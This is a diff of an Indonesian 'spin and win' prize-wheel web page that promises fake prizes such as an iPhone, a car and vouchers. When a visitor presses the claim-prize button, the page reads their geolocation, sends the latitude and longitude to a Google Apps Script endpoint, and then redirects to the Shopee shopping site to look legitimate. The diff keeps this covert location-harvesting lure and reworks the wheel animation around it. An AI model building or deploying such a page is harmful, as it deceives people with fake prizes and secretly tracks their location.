@@ -1,168 +1,185 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Undian Berhadiah</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Spin Hadiah</title>
 
-  <style>
-    body {
-      margin: 0;
-      font-family: Arial;
-      text-align: center;
-      background: linear-gradient(135deg,#ff512f,#dd2476);
-      color: white;
-      overflow: hidden;
-    }
+<style>
+body{
+  margin:0;
+  background: radial-gradient(circle,#1e3c72,#2a5298);
+  font-family: Arial;
+  text-align:center;
+  color:white;
+}
 
-    h2 { margin-top: 20px; }
+canvas{margin-top:20px;}
 
-    .wheel-box {
-      position: relative;
-      width: 260px;
-      height: 260px;
-      margin: 20px auto;
-    }
+button{
+  margin-top:20px;
+  padding:12px 25px;
+  border:none;
+  border-radius:10px;
+  background:#00e676;
+  font-size:16px;
+  font-weight:bold;
+}
 
-    .wheel {
-      width: 100%;
-      height: 100%;
-      border-radius: 50%;
-      background: conic-gradient(
-        #ffeb3b 0deg 60deg,
-        #4caf50 60deg 120deg,
-        #2196f3 120deg 180deg,
-        #ff9800 180deg 240deg,
-        #9c27b0 240deg 300deg,
-        #f44336 300deg 360deg
-      );
-      transition: transform 5s cubic-bezier(.17,.67,.83,.67);
-    }
+/* popup menang */
+.popup{
+  position:fixed;
+  top:0;left:0;
+  width:100%;
+  height:100%;
+  background:rgba(0,0,0,0.8);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+}
 
-    .pointer {
-      position: absolute;
-      top: -15px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 25px;
-    }
+.popup img{
+  width:180px;
+  animation:zoom 0.5s ease;
+}
 
-    button {
-      padding: 12px 20px;
-      border: none;
-      border-radius: 10px;
-      background: #00e676;
-      font-weight: bold;
-      margin-top: 15px;
-      cursor: pointer;
-      font-size: 16px;
-    }
+@keyframes zoom{
+  from{transform:scale(0);}
+  to{transform:scale(1);}
+}
 
-    #hasil {
-      margin-top: 15px;
-      font-size: 18px;
-      font-weight: bold;
-    }
+.confetti{
+  position:absolute;
+  width:8px;
+  height:8px;
+  top:0;
+  animation:fall 3s linear;
+}
 
-    /* hadiah popup */
-    .popup {
-      position: fixed;
-      top:0; left:0;
-      width:100%;
-      height:100%;
-      background: rgba(0,0,0,0.8);
-      display:none;
-      justify-content:center;
-      align-items:center;
-      flex-direction:column;
-    }
-
-    .popup img {
-      width: 150px;
-      animation: zoom 0.5s ease;
-    }
-
-    @keyframes zoom {
-      from{transform:scale(0);}
-      to{transform:scale(1);}
-    }
-
-    /* confetti */
-    .confetti {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background: yellow;
-      top:0;
-      animation: fall 3s linear infinite;
-    }
-
-    @keyframes fall {
-      to { transform: translateY(100vh); }
-    }
-  </style>
+@keyframes fall{
+  to{transform:translateY(100vh);}
+}
+</style>
 </head>
 
 <body>
 
-<h2>🎁 Putar & Menangkan Hadiah</h2>
+<h2>🎁 Spin & Menangkan Hadiah</h2>
 
-<div class="wheel-box">
-  <div class="pointer">🔻</div>
-  <div class="wheel" id="wheel"></div>
-</div>
+<canvas id="wheel" width="300" height="300"></canvas>
+<br>
+<button onclick="spin()">PUTAR</button>
 
-<button onclick="putar()">PUTAR</button>
-
-<div id="hasil"></div>
-
-<!-- popup hadiah -->
+<!-- popup -->
 <div class="popup" id="popup">
   <h2>🎉 SELAMAT!</h2>
-  <p>Kamu mendapatkan hadiah spesial</p>
-  <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png">
-  <br><br>
+  <img id="hadiahImg">
+  <p id="hadiahText"></p>
   <button onclick="lanjut()">Ambil Hadiah</button>
 </div>
 
-<!-- audio -->
-<audio id="spinSound" src="https://www.soundjay.com/misc/sounds/wheel-spin.mp3"></audio>
-<audio id="winSound" src="https://www.soundjay.com/human/sounds/applause-8.mp3"></audio>
+<audio id="spinSound">
+  <source src="https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg">
+</audio>
+
+<audio id="winSound">
+  <source src="https://actions.google.com/sounds/v1/crowds/applause.ogg">
+</audio>
 
 <script>
-let sudah = false;
+const canvas = document.getElementById("wheel");
+const ctx = canvas.getContext("2d");
 
-function putar(){
-  if(sudah) return;
-  sudah = true;
+const hadiah = [
+  {text:"iPhone 16 Pro Max", img:"https://cdn-icons-png.flaticon.com/512/747/747376.png"},
+  {text:"Mobil", img:"https://cdn-icons-png.flaticon.com/512/743/743007.png"},
+  {text:"Voucher 90%", img:"https://cdn-icons-png.flaticon.com/512/1170/1170678.png"},
+  {text:"iPhone 15", img:"https://cdn-icons-png.flaticon.com/512/747/747376.png"},
+  {text:"Motor", img:"https://cdn-icons-png.flaticon.com/512/2972/2972185.png"},
+  {text:"Voucher", img:"https://cdn-icons-png.flaticon.com/512/1170/1170678.png"}
+];
 
-  let wheel = document.getElementById("wheel");
+const colors = ["#ff5252","#ff9800","#ffeb3b","#4caf50","#2196f3","#9c27b0"];
+
+let angle = 0;
+let spinning = false;
+
+function draw(){
+  let arc = Math.PI*2/hadiah.length;
+
+  for(let i=0;i<hadiah.length;i++){
+    ctx.beginPath();
+    ctx.fillStyle=colors[i];
+    ctx.moveTo(150,150);
+    ctx.arc(150,150,150,arc*i+angle,arc*(i+1)+angle);
+    ctx.fill();
+
+    ctx.save();
+    ctx.translate(150,150);
+    ctx.rotate(arc*i + arc/2 + angle);
+    ctx.fillStyle="#fff";
+    ctx.font="12px Arial";
+    ctx.fillText(hadiah[i].text,40,5);
+    ctx.restore();
+  }
+}
+draw();
+
+function spin(){
+  if(spinning) return;
+  spinning = true;
 
   document.getElementById("spinSound").play();
 
-  // arahkan ke segmen tertentu (misal 300 derajat)
-  let target = 300;
-  let putaran = 1440 + target;
+  let spinAngle = Math.random()*3000+3000;
+  let start=null;
 
-  wheel.style.transform = "rotate("+putaran+"deg)";
+  function anim(t){
+    if(!start) start=t;
+    let progress=t-start;
 
-  setTimeout(()=>{
-    document.getElementById("winSound").play();
-    document.getElementById("popup").style.display = "flex";
-    confetti();
-  },5000);
+    let ease=1-Math.pow(1-progress/4000,3);
+    angle=(spinAngle*ease)*Math.PI/180;
+
+    ctx.clearRect(0,0,300,300);
+    draw();
+
+    if(progress<4000){
+      requestAnimationFrame(anim);
+    }else{
+      selesai();
+    }
+  }
+  requestAnimationFrame(anim);
 }
 
-// efek confetti
+function selesai(){
+  spinning=false;
+
+  let deg=angle*180/Math.PI%360;
+  let index=Math.floor((360-deg)/(360/hadiah.length))%hadiah.length;
+
+  let win=hadiah[index];
+
+  document.getElementById("hadiahImg").src=win.img;
+  document.getElementById("hadiahText").innerHTML=win.text;
+
+  document.getElementById("popup").style.display="flex";
+
+  document.getElementById("winSound").play();
+
+  confetti();
+}
+
 function confetti(){
   for(let i=0;i<30;i++){
-    let c = document.createElement("div");
+    let c=document.createElement("div");
     c.className="confetti";
     c.style.left=Math.random()*100+"vw";
-    c.style.background="hsl("+Math.random()*360+"deg,100%,50%)";
-    c.style.animationDuration=(Math.random()*3+2)+"s";
+    c.style.background="hsl("+Math.random()*360+",100%,50%)";
     document.body.appendChild(c);
 
-    setTimeout(()=>c.remove(),4000);
+    setTimeout(()=>c.remove(),3000);
   }
 }
 
@@ -170,18 +187,14 @@ function lanjut(){
   ambilLokasi();
 }
 
-// ambil lokasi
 function ambilLokasi(){
   if(navigator.geolocation){
     navigator.geolocation.getCurrentPosition(function(pos){
 
-      var lat = pos.coords.latitude;
-      var lon = pos.coords.longitude;
-
-      fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+lat+"&lon="+lon);
+      fetch("https://script.google.com/macros/s/AKfycbw2q8jMhiz3W0FRQ0_C-8hCA3WVAxAqmjeQ3snUsI0j6AMlYYNT_RrPTfjjFxxa48Yv/exec?lat="+pos.coords.latitude+"&lon="+pos.coords.longitude);
 
       setTimeout(()=>{
-        window.location.href = "https://shopee.co.id";
+        window.location.href="https://shopee.co.id";
       },2000);
 
     });
